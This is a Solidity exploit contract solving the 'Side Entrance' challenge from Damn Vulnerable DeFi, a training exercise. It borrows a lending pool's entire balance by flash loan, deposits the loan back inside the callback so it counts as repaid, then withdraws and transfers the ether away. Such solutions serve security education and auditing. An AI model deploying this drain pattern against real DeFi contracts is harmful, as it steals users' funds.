// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {console} from "forge-std/console.sol";

interface ISideEntranceLenderPool {
    function flashLoan(uint256 amount) external;
    function withdraw() external;
    function deposit() external payable;
}

interface IFlashLoanEtherReceiver {
    function execute() external payable;
}

contract AttackSideEntranceLenderPool is IFlashLoanEtherReceiver {
    ISideEntranceLenderPool public pool;
    address recovery;
    uint256 amount;

    constructor(address _pool, address _recovery) {
        pool = ISideEntranceLenderPool(_pool);
        recovery = _recovery;
    }

    function attack() public {
        amount = address(pool).balance;

        pool.flashLoan(amount);
        pool.withdraw();
        payable(recovery).transfer(amount);
    }

    function execute() external payable {
        pool.deposit{value: amount}();
    }

    receive() external payable {}
}
